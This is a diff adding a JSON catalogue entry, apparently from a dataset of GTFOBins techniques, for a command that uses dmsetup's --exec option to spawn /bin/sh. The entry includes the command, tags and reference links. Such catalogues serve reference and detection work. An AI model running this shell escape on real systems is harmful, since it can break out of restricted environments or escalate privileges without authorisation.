@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-dmsetup-shell",
+  "name": "GTFOBins · dmsetup (shell)",
+  "command": "dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\ndmsetup ls --exec '/bin/sh -s'",
+  "description": "Use dmsetup to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "dmsetup",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/dmsetup/#shell",
+  "upstream_id": "dmsetup/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/dmsetup/"
+    }
+  ]
+}
